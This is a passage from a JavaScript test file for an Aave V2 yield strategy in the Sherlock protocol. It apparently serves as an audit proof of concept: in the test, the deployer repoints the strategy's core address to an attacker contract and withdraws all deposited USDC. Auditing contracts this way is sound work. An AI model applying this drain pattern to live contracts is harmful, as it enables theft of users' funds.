...
describe('AaveV2 ─ Functional', function () {
  ...
  describe('Attack by deployer', function () {
    before(async function () {
      await timeTraveler.revertSnapshot();
    });
    it('Verify state before attack', async function () {
      expect(await this.usdc.balanceOf(this.sherlock.address)).to.eq(USDC_AMOUNT);
      expect(await this.usdc.balanceOf(this.aaveStrategy.address)).to.eq(0);
    });
    it('Deposit goes through', async function () {
      this.t0 = await meta(this.sherlock.yieldStrategyDeposit(USDC_AMOUNT));
      expect(await this.usdc.balanceOf(this.sherlock.address)).to.eq(0);
      expect(await this.usdc.balanceOf(this.aaveStrategy.address)).to.eq(0);
    });
    it('Corrupt Sherlock core is set and  withdraws', async function () {
      //Assume these are mined in the same block
      await this.aaveStrategy.setSherlockCoreAddress(this.attackSherlock.address);
      await this.attackSherlock.yieldStrategyWithdrawAll();

      expect(await this.usdc.balanceOf(this.attackSherlock.address)).to.be.closeTo(
        USDC_AMOUNT,
        this.aUsdcYieldError,
      );
      expect(await this.usdc.balanceOf(this.aaveStrategy.address)).to.eq(0);
